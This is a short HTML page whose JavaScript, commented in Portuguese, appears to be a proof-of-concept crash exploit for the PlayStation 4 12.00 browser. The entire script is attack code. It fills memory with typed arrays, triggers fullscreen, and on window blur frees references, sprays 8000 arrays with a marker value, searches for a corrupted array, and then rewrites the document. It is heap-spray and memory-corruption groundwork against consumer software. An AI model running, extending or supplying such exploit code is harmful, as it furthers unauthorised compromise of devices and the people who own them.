<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 FullScreen+Blur Crash - Test arr=null</title>
</head>
<body>

<h1>PS4 12.00 - Crash Isolation (arr=null test)</h1>

<button onclick="runCrashTest1()">Run Crash</button>
<div id="result1"></div>   

<script>
const PATTERN = 2.121995791e-314;

function runCrashTest1() {
    const result = document.getElementById('result1');
    result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
    
    let controllers = [];

    // Passo 1 (inalterado)
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    
    // Passo 2 (inalterado)
    const elem = document.documentElement;
    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
    
    // Passo 3 (inalterado)
    window.onblur = function() {
        result.innerHTML += '<p>onblur triggered</p>';
        
        // 🔴 TESTE: remover referências aos TypedArrays
        result.innerHTML += '<p>Nullificando referências...</p>';
        controllers = null;

        // (opcional leve GC pressure sem alterar muito timing)
        for (let i = 0; i < 1000; i++) {
            new ArrayBuffer(0x1000);
        }

        // Passo 4 (spray mantido)
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        // Passo 5 (mantido, mas pode não encontrar nada agora)
        let corrupted = null;
        if (controllers) {
            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    break;
                }
            }
        }

        result.innerHTML += '<p>Seguindo para document.write...</p>';

        // Passo 6 (INALTERADO - CRÍTICO)
        setTimeout(() => {
            document.open();
            document.write('<html><body><h1>Crash</h1></body></html>');
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}

</script>

</body>
</html>
